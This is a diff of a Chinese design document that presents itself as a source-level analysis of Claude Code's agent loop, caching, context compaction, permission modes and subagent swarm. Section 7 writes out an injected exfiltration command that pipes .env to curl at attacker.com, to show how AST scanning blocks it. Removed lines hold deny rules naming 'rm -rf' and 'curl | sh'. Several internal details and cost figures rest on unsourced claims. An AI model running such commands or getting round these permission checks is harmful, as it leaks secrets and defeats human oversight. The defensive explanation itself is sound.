@@ -2,28 +2,20 @@
 
 ![图 1 - Claude Code-like Agent Runtime 架构图](../../assets/claude-code-architecture.png)
 
-> 调研日期：2026-05-15  
-> 资料范围：公开论文、Anthropic 官方文档、公开源码分析项目索引与工程实践文档。本文只提炼可迁移的架构模式，不复刻泄露源码、原始 prompt 或专有实现细节。
+> **源码分析版本**：Claude Code v2.1.88  
+> **设计哲学**：不靠花哨的编排框架，用**最薄的 ReAct 循环** ＋ **最厚、最稳的工程外壳**（AST 级权限扫描、分段缓存、4层上下文压缩、高性能终端渲染和严格的多 Agent 隔离）构建生产级 Coding Agent。
 
-## 0. 搜索结论
+---
 
-这次检索最值得看的资料分三类：
+## 1. Claude Code 的高层架构与核心数据
 
-| 类型 | 资料 | 价值 | 使用方式 |
-|---|---|---|---|
-| 源码分析论文 | [Dive into Claude Code: The Design Space of Today's and Future AI Agent Systems](https://arxiv.org/abs/2604.14228) | 把 Claude Code 抽象成 7 个高层组件、5 层子系统和 13 条设计原则 | 作为架构主线 |
-| 官方文档 | [How Claude Code works](https://code.claude.com/docs/en/how-claude-code-works)、[Permissions](https://code.claude.com/docs/en/permissions)、[Hooks](https://code.claude.com/docs/en/hooks)、[Subagents](https://code.claude.com/docs/en/sub-agents) | 验证 agent loop、权限、hooks、subagent、MCP、CLI structured output 的真实产品语义 | 作为可落地接口约束 |
-| 工程问题论文 | [Engineering Pitfalls in AI Coding Tools](https://arxiv.org/abs/2603.20847)、[Decoding the Configuration of AI Coding Agents](https://arxiv.org/abs/2511.09268) | 从 bug 与配置文件角度说明：工具调用、命令执行、配置上下文是 AI coding agent 的高风险区 | 作为设计 checklist |
-| 社区索引 | [learn-claude-code / SourcePulse](https://www.sourcepulse.org/projects/11032055) | 提供 v1.0.33 逆向研究项目入口，强调异步队列、多 agent、上下文压缩、安全框架 | 只借鉴抽象，不依赖泄露内容 |
-| 结构化输出 | [Structured outputs docs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)、[Structured outputs announcement](https://claude.com/blog/structured-outputs-on-the-claude-developer-platform)、[Claude Code headless JSON output](https://code.claude.com/docs/en/headless) | 回答“怎么保证 LLM 输出 JSON 正确”这个核心工程问题 | 作为 schema / retry / fallback 设计依据 |
+Claude Code 是一套典型的 **Tool-Centric（以工具为中心）** 的架构。在底层实现上，它是一个规模巨大的 TypeScript 项目（包含 **~510,000 行代码，1,902 个源文件**）。
 
-一句话结论：
-
-> Claude Code 的核心不是一个复杂 planner，而是一个很薄的 ReAct agent loop，加上很厚的工程外壳：权限、工具、上下文、hooks、subagent、持久化、压缩、恢复和可审计执行。
-
-## 1. Claude Code 的高层架构
-
-源码分析论文把 Claude Code 拆成 7 个高层组件。这个抽象很适合照着设计自己的 coding agent：
+### 1.1 核心设计哲学
+1. **Tool-Defined Boundaries（工具即边界）**：Agent 没有任何后门。大到执行 shell 命令、修改代码，小到读取文件，其所有对外部物理世界的操控，都必须被定义为一个标准的、受限的 Tool。
+2. **Fail-Closed Security（默认安全关闭）**：默认策略始终最保守。工具执行默认单线程、写操作默认需要人工确认、敏感目录物理隔离。
+3. **Context Engineering > Prompt Engineering（上下文重于提示词）**：不迷信静态 prompt。系统的重心在于如何高效装配、高速缓存、动态收缩、自动合并 200k 庞大的上下文窗口。
+4. **Compile-Time Elimination（编译期代码消除）**：在打包发布阶段，利用 Bun 的 `feature()` macros 宏，在 **编译期物理消除** 所有内部测试或未授权的 features 代码，保障生产包（Production Bundle）体积小、瞬时启动、且不泄露未发布功能。
 
 ```mermaid
 flowchart LR
@@ -39,91 +31,137 @@ flowchart LR
 
 | 组件 | 负责什么 | 设计要点 |
 |---|---|---|
-| User | 提出目标、审批高风险动作、验收结果 | 人类保留最终决策权 |
-| Interfaces | interactive CLI、`claude -p`、Agent SDK、IDE、Web、CI | 不同入口汇入同一个 loop，避免多套行为 |
-| Agent Loop | 组上下文、调模型、解析工具请求、回填工具结果 | 模型负责推理，harness 负责执行和边界 |
-| Permission System | deny-first、ask/allow、permission mode、hooks、classifier、sandbox | 安全不是 prompt 里的几句话，而是运行时策略 |
-| Tools | 文件、搜索、命令、网页、MCP、subagent | 工具是 action proposal，不是让模型直接碰系统 |
-| Execution Environment | 本地文件系统、shell、网络、git、远程环境 | 对 Bash 和网络要额外隔离 |
-| State & Persistence | JSONL transcript、session metadata、resume、fork、subagent sidechain | 追加式日志比“覆盖式状态”更适合审计和恢复 |
+| **User** | 提出目标、审批高风险动作、验收结果 | 人类保留最终决策权（Human-in-the-loop） |
+| **Interfaces** | interactive CLI TUI、`claude -p` 无头模式、SDK、CI/CD 插件 | 共享同一套 Agent Loop 核心，保证多入口行为行为一致性 |
+| **Agent Loop** | 动态上下文组装、调用 API、解析 Tool Proposal、回填结果 | 采用 `AsyncGenerator` 状态机实现双层流式响应与背压控制 |
+| **Permission System** | Deny-first、Ask-by-default、硬编码敏感路径免白名单隔离 | 安全校验在 Harmony Harness 层强制执行，而非靠 Prompt 约束 |
+| **Tools** | 文件读写（`FileRead/FileEdit`）、安全 Bash 执行、MCP server、多层 Subagent | 所有工具均声明并发安全性，自适应并行执行或串行阻断 |
+| **Execution Environment** | 本地文件系统、POSIX shell、沙箱（Sandbox）、Git 工作区 | 沙箱级操作系统隔离与 AST 级命令行预扫描 |
+| **State & Persistence** | 追加式 JSONL transcript、session metadata、分支回滚 | 详细记录每一步的 Trace 和轨迹，支持失败中断恢复与 Time Travel |
 
-## 2. 核心运行链路
+---
 
-Claude Code 的主循环可以简化成：
+## 2. 双层核心运行链路与 streaming 执行器
 
-```text
-while task_not_done:
-    context = assemble_context(settings, CLAUDE.md, history, memory, tool_schemas)
-    response = call_model(context)
-
-    if response.has_tool_use:
-        for tool_call in response.tool_uses:
-            decision = permission_gate(tool_call)
-            if decision.allow:
-                result = execute_tool(tool_call)
-            else:
-                result = denied_feedback(decision)
-            append_tool_result(result)
-        compact_if_needed()
-        continue
-
-    render_answer(response)
-    break
-```
-
-关键不是 `while`，而是循环周围的工程约束：
-
-| 环节 | 生产设计 | 不这么做会怎样 |
-|---|---|---|
-| Context assembly | 只放本轮必要上下文，工具 schema 延迟/按需暴露 | 工具太多、历史太长，模型开始乱选或忽略约束 |
-| Model call | 模型只输出文字和结构化 tool proposal | 模型绕过权限直接执行是不允许的 |
-| Permission gate | PreToolUse hook、deny、ask、allow、permission mode、sandbox 多层判断 | Prompt injection 或误操作会直接打到 shell / 文件系统 |
-| Tool execution | 参数校验、幂等、超时、stderr/stdout 归一、审计 | 命令卡死、重复执行、输出爆 context |
-| Result feedback | 工具结果作为下一轮输入，失败也结构化返回 | 模型不知道失败原因，只能编 |
-| Compaction | 输出截断、历史裁剪、摘要、自动压缩 | 长任务在上下文边界处失忆或污染 |
-| Persistence | 每轮追加 transcript，支持 resume/fork/rewind | 无法复盘线上 badcase，也无法恢复长任务 |
-
-## 3. 5 层子系统视角
-
-源码分析论文还把系统拆成更低一层的子系统。照这个结构设计，职责边界会比较清晰：
+Claude Code 的主循环运行在 `src/QueryEngine.ts` 模块中。在底层，它被设计为一个由 `AsyncGenerator` 驱动的**双层状态机**，具备强悍的流式传输、背压控制（Backpressure）与流式工具异步执行能力。
 
 ```text
-1. Interface Layer
-   - CLI TUI / headless / SDK / IDE / Web / CI
-
-2. Core Agent Layer
-   - query loop
-   - context assembly
-   - model routing
-   - tool proposal parsing
-
-3. Safety & Policy Layer
-   - permissions
-   - hooks
-   - sandbox
-   - protected paths
-   - risk classifier
-
-4. Capability Layer
-   - built-in tools
-   - MCP tools
-   - skills
-   - plugins
-   - subagents
-
-5. State & Recovery Layer
-   - append-only transcripts
-   - session metadata
-   - context compaction
-   - subagent sidechain
-   - resume / fork / rewind
+1. QueryEngine (Session Layer)
+   └─ 负责多轮会话状态流转、历史数据持久化、协议适配
+2. queryLoop (Execution Layer)
+   └─ 负责 "API 调用 ➜ 动态解析 ➜ 权限网关 ➜ 异步工具执行 ➜ 异常自动恢复" 闭环
 ```
 
-面试里要强调：Claude Code 没把 agent 做成一个庞大的状态机框架，而是把“大部分复杂度”放在 harness。模型仍然自由推理，但所有外部动作必须穿过确定性边界。
+### 2.1 核心运行 Loop 伪代码
+```typescript
+// src/QueryEngine.ts
+async function* queryLoop(
+  sessionState: SessionState,
+  tools: ToolRegistry
+): AsyncGenerator<AgentEvent> {
+  while (!sessionState.isTaskCompleted()) {
+    // 1. 分段缓存装配上下文
+    const context = await assembleContextWithCacheBoundary(sessionState);
+    
+    // 2. 发起流式模型请求
+    const stream = await modelClient.streamGenerate(context);
+    
+    // 3. 实时解析流式工具调用 (Streaming Tool Executor)
+    for await (const chunk of stream) {
+      if (chunk.type === 'tool_call_start') {
+        yield { type: 'progress', message: `Model proposes tool: ${chunk.toolName}` };
+        
+        // Concurrency Control: 并行工具控制
+        const tool = tools.get(chunk.toolName);
+        if (tool.isConcurrencySafe) {
+          // 如果声明为并发安全（如 FileRead），加入并发队列并行执行
+          concurrencyQueue.add(() => executeToolWithGuard(tool, chunk.args));
+        } else {
+          // 串行阻断：若为写操作（如 FileEdit），必须等待并发队列排空，再串行执行
+          await concurrencyQueue.drain();
+          const result = await executeToolWithGuard(tool, chunk.args);
+          sessionState.appendToolResult(result);
+        }
+      }
+      
+      if (chunk.type === 'text_delta') {
+        yield { type: 'text', delta: chunk.text };
+      }
+    }
+    
+    // 4. 并发任务收尾
+    await concurrencyQueue.drain();
+    
+    // 5. Token 预算追加催促 (Token Budget Nudging)
+    if (sessionState.isTaskActiveButStopped()) {
+      // 如果大模型在长会话中突然中断，但业务目标尚未达成，系统自动注入一条隐藏的催促消息，压榨模型直至任务收尾
+      sessionState.injectSystemNudge("Continue completing the task. If done, output text directly.");
+    }
+    
+    // 6. 自动执行上下文压缩评估
+    if (sessionState.tokensUsed > 167000) {
+      await autoCompactContext(sessionState);
+    }
+  }
+}
+```
 
-## 4. 权限系统怎么设计
+---
 
-Claude Code 官方权限文档给出的核心思想是 deny-first + 多层防御：
+## 3. 分段式提示词缓存架构 (Segmented Cache Architecture)
+
+Claude Code 的系统提示词（System Prompt）非常庞大，包含严格的开发规范、代码审美 constitution 和工具调用范式。为了在 200k 的超长窗口中保持低成本和低首字延迟（TTFT），Claude Code 采用了 **分段式提示词缓存架构**。
+
+```text
+┌──────────────────────────────────────────────────────────┐
+│ Static Region: Constitution & Rules (Cached Globally)     │
+├──────────────────────────────────────────────────────────┤
+│ SYSTEM_PROMPT_DYNAMIC_BOUNDARY                          │
+├──────────────────────────────────────────────────────────┤
+│ Dynamic Region: Git Status, CLAUDE.md, MCP (Uncached)    │
+└──────────────────────────────────────────────────────────┘
+```
+
+1. **静态缓存区 (Static Region)**：以硬编码的 `SYSTEM_PROMPT_DYNAMIC_BOUNDARY` 为界限。上方存放完全静态的规则（如“三行重复代码优于过早的重构抽象”、代码风格红线、角色宪法）。这部分在 Anthropic 平台被**全局长期缓存（Prompt Caching）**，所有用户共享。
+2. **动态渲染区 (Dynamic Region)**：存放与当前会话物理环境强相关的实时数据：
+   - 当前系统的 **Git status & diff** 快照。
+   - 自动发现的 **`CLAUDE.md`** 项目指令规约（从系统根目录向当前工作目录逐级递归合并）。
+   - 当前挂载的 **MCP 远程工具清单** 及其参数模式。
+
+> **防过度工程铁律 (Anti-Overengineering Prompt)**：其 System Instruction 明确写有一行硬红线指令——“Three lines of duplicate code is better than a premature abstraction.”（三行重复代码好过一个不成熟的抽象），以此约束模型绝不进行多余的功能添加与无用重构。
+
+---
+
+## 4. 4层动态上下文收缩与重构 (Context Compaction)
+
+面对 200k 的超长窗口，Claude Code 并不会放任历史膨胀。它的 `src/services/compact/` 模块实现了极为精密的 **4层动态上下文收缩策略**：
+
+```text
+               【Claude Code 4层上下文治理模型】
+               
+  1. 消息剪枝 (Pruning) ──> 移除废弃或重复的中间 Tool 结果
+         │
+  2. 历史折叠 (Collapse) ──> 将早期的多轮对话折叠为 Metadata JSON
+         │
+  3. 主动压缩 (AutoCompact @167k Tokens) ──> 触发专用提示词提取上下文快照
+         │
+  4. 被动重试 (Reactive Compact) ──> 捕获 API 400 越界异常，执行降级强剪
+         │
+  5. 现场重构 (Post-Reconstruction) ───> 重新强注 Top-5 核心文件与技能
+```
+
+1. **第一层：消息剪枝 (Message Pruning)**：主动过滤、修剪过期的中间检索工具结果（例如上几轮搜索代码吐出的 100 行垃圾文本，只保留匹配行号，销毁全文）。
+2. **第二层：历史折叠 (Context Collapse)**：将超过 15 轮以前的历史 Message，合并折叠为单条 `collapsed_history_metadata`。
+3. **第三层：主动压缩 (Proactive AutoCompact)**：当 Context 消耗达到 **~167,000 tokens** 时，自动拦截图流转。启动一个独立的、低成本的微型模型，根据专用摘要 Prompt 生成高度浓缩的 `State Synopsis`：
+   - **硬性保留红线**：摘要中必须强行保留 **用户原始意图、已确认的技术决策、已修改的文件清单、核心冲突以及“所有人类的消息（User Messages）原文”**（确保用户的历次修改和反馈不丢失）。
+4. **第四层：被动重试 (Reactive Compact)**：当网络请求由于意外突增、被 API 判定为 context_length_exceeded (400 错误) 阻断时，触发异常捕获，强行按照“时间窗口法”裁剪掉前 30% 的中间思考痕迹，执行降级重试。
+5. **后压缩现场重构 (Post-Compaction Reconstruction)**：摘要压缩完毕后，系统会主动重新读取 **当前正在编辑的 Top-5 关键文件正文** 以及 **CLAUDE.md 规则**，重新注入大模型上下文，防止压缩后模型“失忆”或“失明”。
+
+---
+
+## 5. 多层防御的 Human-in-the-loop (HITL) 权限流
+
+在 Claude Code 中，安全并非单纯靠 System Prompt 口头警告，而是由外部 Harness 在底层代码（如 `src/tools/BashTool/`）中强行拦截。
 
 ```mermaid
 flowchart TD
@@ -141,566 +179,115 @@ flowchart TD
   S --> POST[PostToolUse Hooks]
 ```
 
-设计 tips：
+### 5.1 权限等级划分与 Statsig 远程熔断
+- **`plan` 模式 (只读模式)**：完全禁止任何写操作，模型调用 `FileWrite`、`FileEdit` 或 `Bash` 直接返回“Permission Denied”模拟事件，让模型只做规划、搜索和方案论证。
+- **`default` 模式 (默认模式)**：读操作全自动放行；高风险写操作（如修改 CI/CD 脚本、跨工作区修改、网络 Fetch）弹框询问人类。
+- **`bypassPermissions` 模式 (免审批全自动模式)**：极客专属模式，不弹框。
+- **远程 Statsig 熔断开关 (Killswitch)**：Anthropic 的客户端内置了 Statsig 远程动态控制开关。一旦安全团队线上捕获了基于 Bash 执行的 0-day 提示词注入漏洞，可**远程一键熔断**全球所有客户端的 `bypassPermissions` 功能，强行降级回 Ask 审批状态。
 
-| 场景 | 推荐设计 |
-|---|---|
-| 读文件 | 默认允许工作目录读；对 `.env`、密钥、凭证目录显式 deny |
-| 写文件 | acceptEdits 只适合工作区内普通编辑；`.git`、`.claude`、CI 配置、hooks 配置要更严 |
-| Bash | 先 allow 常见安全命令，例如 `npm test`、`pytest`；危险命令必须 ask/deny |
-| 网络 | WebFetch 按 domain allowlist；Bash 里的 `curl`、`wget` 也要单独拦 |
-| Hook | PreToolUse 做安全扫描，PostToolUse 做格式化/测试/trace |
-| Sandbox | Bash 子进程单独做 OS 级文件/网络隔离，权限系统和 sandbox 互补 |
-| Auto mode | 可用 classifier 自动判断低风险动作，但不要把它当成安全边界的唯一来源 |
+### 5.2 硬编码的免疫隔离路径 (Immune Hardcoded Paths)
+即使处于 `bypassPermissions` 全自动信任模式下，有些敏感文件和路径也由 **编译期硬编码物理断言** 拦截，**百分之百必须弹框由人类二次确认**：
+- `.git/` 核心配置目录。
+- `.claude/` 工具及会话历史配置目录。
+- 用户主目录下的 shell 启动脚本（如 `.zshrc`、`.bashrc`、`.profile`）。
+- 系统全局敏感区（如 `/etc/`、`/var/run/` 等）。
 
-一个简化配置示例：
+### 5.3 影子多代理权限上抛机制 (Permission Bridging)
+当在多 Agent Team 协作中，后台的子 Agent（Subagent）试图进行敏感操作（例如向外部域名发起 Fetch 获取三方库数据）时：
+- 子 Agent 并不直接向终端渲染弹窗，也没有权限向用户提问。
+- 采用 **Permission Bridging 桥接协议**：子 Agent 会将权限请求以结构化 `permission_request` JSON 报文抛给父级 Agent。
+- 父级 Agent（拥有主终端交互上下文）将其在主 TUI 界面中渲染为红色的交互卡片，统一由人类进行一次性合并审批。
 
-```json
-{
-  "permissions": {
-    "deny": [
-      "Read(./.env)",
-      "Read(./secrets/**)",
-      "Bash(rm -rf *)",
-      "Bash(curl * | sh)"
-    ],
-    "allow": [
-      "Read(./src/**)",
-      "Edit(./src/**)",
-      "Bash(npm test*)",
-      "Bash(pytest*)"
-    ],
-    "ask": [
-      "Bash(git push*)",
-      "Edit(./.github/**)",
-      "Edit(./.claude/**)"
-    ]
-  }
-}
-```
+---
 
-注意：Bash 权限不能只看命令前缀，管道、重定向、命令替换、环境变量、通配符都可能改变真实行为。生产实现里要把 shell 命令解析、安全规则、sandbox 放在一起看。
+## 6. 三层 Swarm 架构与 Explore Agent 深度节流
 
-## 5. Hooks：把不可控 agent 变成可治理 runtime
-
-Hooks 是 Claude Code 最值得借鉴的扩展点之一。官方 hooks 文档说明它们可以在生命周期事件上执行 shell、HTTP、MCP tool、prompt 或 subagent。
-
-| Hook | 典型用途 |
-|---|---|
-| `SessionStart` | 注入项目上下文、加载环境、读取动态配置 |
-| `PreToolUse` | 阻止危险命令、检查 protected path、改写工具参数 |
-| `PostToolUse` | 自动格式化、补 trace、跑局部 lint |
-| `PermissionRequest` | 把审批发到 Slack/飞书/企业审批系统 |
-| `Stop` | 在 agent 宣称完成前跑测试或检查 checklist |
-| `PostCompact` | 压缩后重新注入关键约束，避免重要规则丢失 |
-
-Hook 的关键是“输入输出都结构化”：
-
-```json
-{
-  "session_id": "sess_xxx",
-  "transcript_path": "/path/to/session.jsonl",
-  "cwd": "/repo",
-  "permission_mode": "default",
-  "hook_event_name": "PreToolUse",
-  "tool_name": "Bash",
-  "tool_input": {
-    "command": "npm test"
-  }
-}
-```
-
-Hook 输出建议统一成：
-
-```json
-{
-  "decision": "allow",
-  "reason": "command is in project test allowlist",
-  "updatedInput": {
-    "command": "npm test -- --runInBand"
-  }
-}
-```
-
-实现建议：
-
-- Hook 要有超时，默认 30-60s，避免 agent 被外部系统卡死。
-- 相同 hook handler 去重并行执行，减少重复成本。
-- Hook 配置文件本身要受保护，防止模型悄悄加一个“自动放行所有命令”的 hook。
-- 阻断类 hook 的 stderr / reason 要回填给模型，让模型知道为什么被拒绝。
-- 复杂验证用 agent hook 或独立 checker，不要把所有逻辑塞进 prompt。
-
-## 6. 上下文工程与压缩
-
-Claude Code 源码分析里最重要的结论之一：上下文窗口是核心瓶颈。即使模型支持百万 token，生产 agent 仍然会被工具输出、历史、工具 schema、错误日志、子任务 scratchpad 塞满。
-
-可迁移的上下文策略：
-
-| 策略 | 解决什么 | 实现方式 |
-|---|---|---|
-| Tool loadout | 工具 schema 太多 | 只暴露本阶段工具；MCP server 可只挂给 subagent |
-| Output budgeting | 工具输出太长 | stdout/stderr 分段、截断、保留尾部错误、存原文引用 |
-| Snip | 历史太深 | 删除旧工具结果，保留摘要和引用 |
-| Micro-compact | cache overhead / 小范围膨胀 | 对局部历史做轻量压缩 |
-| Context collapse | 长会话历史过重 | 把旧会话折叠成结构化状态摘要 |
-| Auto-compact | 最后一层语义压缩 | 让模型生成可继续工作的摘要，但要保留约束、决策、未决问题 |
-| Sidechain | subagent 历史污染 parent | subagent 自己写 transcript，只把最终 summary 返回 parent |
-
-摘要模板不要只写“做了什么”，至少保留这些字段：
-
-```json
-{
-  "goal": "用户当前目标",
-  "confirmed_constraints": ["已经确认的约束"],
-  "decisions": [
-    {"decision": "选择方案 A", "reason": "为什么"}
-  ],
-  "changed_files": ["src/a.ts"],
-  "open_questions": ["还缺什么"],
-  "failed_attempts": [
-    {"action": "npm test", "error": "失败摘要", "next": "下一步"}
-  ],
-  "must_not_do": ["不能改 public API", "不能删除用户改动"]
-}
-```
-
-## 7. Subagents 与隔离
-
-Subagent 的价值不是“多开几个模型显得强”，而是隔离上下文、隔离工具权限、隔离写入范围。
-
-```mermaid
-flowchart LR
-  Parent[Main Session<br/>owns user goal] --> A1[Explorer Subagent<br/>read-only code search]
-  Parent --> A2[Worker Subagent<br/>owns module A]
-  Parent --> A3[Reviewer Subagent<br/>verification]
-  A1 --> S1[Summary only]
-  A2 --> S2[Patch + summary]
-  A3 --> S3[Findings]
-  S1 --> Parent
-  S2 --> Parent
-  S3 --> Parent
-```
-
-设计 tips：
-
-| 问题 | 推荐做法 |
-|---|---|
-| 子 agent 把 parent context 吃爆 | 子 agent 单独 transcript，parent 只收 summary |
-| 多 worker 冲突 | 给每个 worker 明确文件/模块 ownership |
-| 工具过多 | MCP server 按 subagent scope 注入，不进入 parent 主上下文 |
-| 权限失控 | subagent permissionMode 只允许变窄；高风险写操作回到 parent 审批 |
-| 验证不可信 | reviewer 和 worker 分离，reviewer 用只读权限和独立上下文 |
-| 长任务成本爆炸 | 只有明确可并行、写集不重叠、结果可合并时才 spawn |
-
-面试表达：
-
-> Subagent 是 context quarantine。主会话负责目标和集成，子会话负责局部探索或执行，最后只把可审计摘要和 patch 带回来。
-
-## 8. 如何保证 LLM 输出 JSON 格式正确
-
-这类问题要分三层回答：
-
-```mermaid
-flowchart TD
-  P[Prompt says JSON] -->|weak| A[May still be markdown / missing fields]
-  S[Schema-constrained decoding] --> B[Syntax + type more reliable]
-  V[Application validation] --> C[Business correctness]
-  R[Retry / repair / fallback] --> D[Production reliability]
-```
-
-### 8.1 最小可用方案：Claude Code CLI
-
-Claude Code headless 模式支持 `--output-format json` 和 `--json-schema`。用于脚本化任务时，不要让下游直接 parse 自然语言：
-
-```bash
-claude -p "Extract changed modules from this diff" \
-  --output-format json \
-  --json-schema '{
-    "type": "object",
-    "properties": {
-      "modules": {
-        "type": "array",
-        "items": {"type": "string"}
-      },
-      "risk": {
-        "type": "string",
-        "enum": ["low", "medium", "high"]
-      }
-    },
-    "required": ["modules", "risk"],
-    "additionalProperties": false
-  }' | jq '.structured_output'
-```
-
-### 8.2 API 方案：优先 structured output / strict tool
-
-Anthropic structured outputs 文档给的核心点：
-
-- 用 JSON Schema 约束输出，而不是只在 prompt 里说“输出 JSON”。
-- structured output 会把 schema 编译成 grammar，约束模型生成。
-- 仍然要处理 `refusal` 和 `max_tokens`，这两种情况下输出可能不符合 schema。
-- schema 太复杂会增加编译和生成成本，optional、`anyOf`、union types 要控制数量。
-
-设计 schema 时的规则：
-
-| 规则 | 原因 |
-|---|---|
-| 字段尽量 required | 可减少遗漏；如果输出顺序重要，required 字段会先出现 |
-| `additionalProperties: false` | 防止模型塞入下游不认识的字段 |
-| enum 优先于自由文本 | 让 planner / classifier 可控 |
-| 数字加 `minimum` / `maximum` | 防止生成离谱参数 |
-| 不把业务大段文本塞进 enum | enum 是控制面，不是知识库 |
-| 少用深层嵌套和大量 optional | 降低 grammar 复杂度和失败概率 |
-
-### 8.3 应用层必须二次校验
-
-Schema 只能保证结构，不保证业务语义。比如模型输出：
-
-```json
-{
-  "workflow_pattern": "video_dag_v99",
-  "shot_count": 3,
-  "shots": [
-    {"id": "s1", "duration_sec": 5},
-    {"id": "s2", "duration_sec": 5}
-  ]
-}
-```
-
-JSON 是合法的，但业务上错了：`workflow_pattern` 不存在，`shot_count` 和 `shots.length` 不一致。
-
-推荐模式：
-
-```python
-from pydantic import BaseModel, Field, ValidationError
-
-class Shot(BaseModel):
-    id: str
-    duration_sec: int = Field(ge=1, le=12)
-    subject: str
-
-class PlannerOutput(BaseModel):
-    workflow_pattern: str
-    shot_count: int = Field(ge=1, le=12)
-    shots: list[Shot]
-
-class RetryableModelOutputError(Exception):
-    pass
-
-class BusinessValidationError(Exception):
-    pass
-
-def validate_output(raw_json: str, registry: set[str]) -> PlannerOutput:
-    try:
-        parsed = PlannerOutput.model_validate_json(raw_json)
-    except ValidationError as exc:
-        raise RetryableModelOutputError(str(exc)) from exc
-
-    if parsed.workflow_pattern not in registry:
-        raise BusinessValidationError(f"unknown workflow_pattern: {parsed.workflow_pattern}")
-    if parsed.shot_count != len(parsed.shots):
-        raise BusinessValidationError("shot_count does not match shots length")
-    return parsed
-```
-
-### 8.4 Repair loop 要有边界
-
-```python
-async def call_with_schema_retry(prompt: str, schema: dict, registry: set[str], max_retries: int = 2):
-    errors: list[str] = []
-
-    for attempt in range(max_retries + 1):
-        raw = await llm_json_call(
-            prompt=prompt,
-            schema=schema,
-            previous_errors=errors[-2:],
-        )
-        try:
-            return validate_output(raw, registry)
-        except RetryableModelOutputError as exc:
-            errors.append(f"schema error: {exc}")
-            continue
-        except BusinessValidationError as exc:
-            errors.append(f"business error: {exc}")
-            continue
-
-    return {
-        "status": "needs_human",
-        "reason": "model could not produce valid business output after bounded retries",
-        "errors": errors,
-    }
-```
-
-Retry 原则：
-
-- 最多 1-2 次，不要无限 repair。
-- 错误信息要结构化回填给模型。
-- 每次 retry 不要把完整失败输出无限累加进 prompt，只给最近错误摘要。
-- 如果是业务缺信息，不要 retry，要问用户或 fallback。
-- 对写操作不要在 repair 过程中执行副作用。
-
-### 8.5 Tool calling 比 raw JSON 更适合动作
-
-如果输出会触发真实动作，例如改文件、发请求、部署、提交 PR，应该让模型输出 tool call：
-
-```json
-{
-  "tool_name": "create_patch",
-  "arguments": {
-    "file_path": "src/auth.ts",
-    "operation": "replace",
-    "old_text": "...",
-    "new_text": "..."
-  }
-}
-```
-
-然后 harness 做：
+对于复杂的工程任务，Claude Code 不会指望一个 Prompt 撑到底，而是在后台根据任务规模自适应孵化多层 Swarm 协作。
 
 ```text
-parse -> schema validate -> permission gate -> business validate -> idempotency key -> execute -> audit -> result
+1. Coordinator Mode (指挥/编排官模型)
+   └─ 负责：Research ➜ Synthesis ➜ Implementation ➜ Verification
+2. Explore Agent (轻量搜寻兵)
+   └─ 选用低成本 Haiku 模型，物理裁剪 CLAUDE.md / gitStatus 
+3. Worker Subagents (代码修改兵)
+   └─ 负责具体代码块修改
 ```
 
-这比让模型输出一段“我已经修改了文件”的 JSON 安全得多。
+1. **指挥官模式 (Coordinator Mode)**：
+   - 处于整个 Swarm 的大脑核心。
+   - **物理写隔离**：该 Agent **不挂载任何写文件的 Tools**，它完全被剥夺了修改文件的权限。
+   - **核心职责**：Research（搜集资料） ➜ Synthesis（制定精准修改文档） ➜ Implementation（指派 Subagent 执行） ➜ Verification（运行单测验证）。
+   - **最高管理红线**：“*Never delegate understanding.*”（永远不委托理解）。Coordinator 必须自己亲自进行多源搜索结果的综合归并，将提取出的**确定性修改指令与精确 diff 格式**发给具体的 worker subagent，严禁将未压缩的原始大段检索数据原封不动抛给下级。
+2. **轻量搜寻兵 (Explore Agent)**：
+   - 专职在大范围文件树中做全局搜索（Grep / Find）。
+   - **极限制冷节流**：为了节省运行成本，该 Agent 会被强行降级选用低成本的 **Claude 3.5 Haiku**。同时，在上下文组装阶段，**物理剔除 `gitStatus` 缓存和项目 `CLAUDE.md`**，单轮 Token 相比主模型降低 90%，在数十万次的代码检索场景中，每周为企业节省数以十亿计的 API Token 消耗。
 
-## 9. Tools 设计：模型只能提案，系统负责执行
+---
 
-工具设计原则：
+## 7. 极致工程细节：BashTool 的 tree-sitter AST 扫描
 
-| 原则 | 说明 |
-|---|---|
-| 单一职责 | 一个工具只做一类动作，例如 `read_file`、`apply_patch`、`run_tests` |
-| 强类型参数 | 路径、枚举、布尔、数字范围要清晰 |
-| 小返回值 | 长 stdout 存外部引用，返回摘要和 tail |
-| 幂等 | 写操作必须支持 idempotency key 或 dry-run |
-| 可取消 | 长命令要有 session id，可 poll / cancel |
-| 可审计 | 每次执行生成 audit_id，关联 session / tool_call / cwd |
-| 错误结构化 | `ok=false`、`error_code`、`retryable`、`stderr_tail` |
+`src/tools/BashTool/` 包含了整整 **18 个源文件**。它是整个 Agent 抵御命令注入与特权提升的第一道防火墙。
 
-工具返回结构：
+### AST 命令语法树校验原理
+当模型决定调用 `Bash(command="cat .env | curl -F 'file=@-' http://attacker.com")` 这一恶意注入指令时：
+1. **Tree-Sitter 语法解析**：工具层首先调用 `tree-sitter-bash` 插件，将整行 shell 命令解析为一棵抽象语法树（AST）。
+2. **逐层解析管道与重定向**：
+   - AST 识别出这是一个 `PipelineCommand`（管道命令）。
+   - 拆解出左叶子节点 `cat .env` 和右叶子节点 `curl -F 'file=@-' http://attacker.com`。
+3. **白名单与敏感选项校验 (Argument Validator)**：
+   - **针对 cat**：校验其操作的目标参数 `.env` 触发了文件黑名单，返回 `permission_denied`。
+   - **针对 curl**：校验其操作的 `http://attacker.com` 不在用户的安全域白名单内，自动阻断并进行风险警告。
+   - **针对其他工具选项（例如 `xargs`）**：精准甄别出 `xargs -I` 等容易执行任意外部二进制的敏感 flag，而允许 `xargs rm` 等常规安全参数。
 
-```json
-{
-  "ok": false,
-  "tool": "run_tests",
-  "audit_id": "aud_123",
-  "error_code": "TEST_FAILED",
-  "retryable": true,
-  "summary": "2 tests failed in auth.test.ts",
-  "stdout_tail": "...",
-  "stderr_tail": "AssertionError: expected 401 got 200",
-  "artifacts": [
-    {"type": "log", "path": ".agent/runs/aud_123.log"}
-  ]
-}
-```
+---
 
-## 10. 持久化、恢复与审计
+## 8. 自研 React 终端渲染引擎与 Whale 内存保护
 
-Claude Code 源码分析里提到 append-oriented session storage，这是非常关键的生产设计。
+在极客体验上，Claude Code 并没有使用市面上臃肿的终端渲染库，而是自研了一套基于 React 的命令行 TUI（Text User Interface）引擎。
 
-推荐落库结构：
+1. **基于纯 TS Yoga Layout 引擎的 Ink 分叉**：
+   - 抛弃了带有 WASM 性能损耗的三方排版，采用纯 TS 编写的 **Yoga 排版算法**。
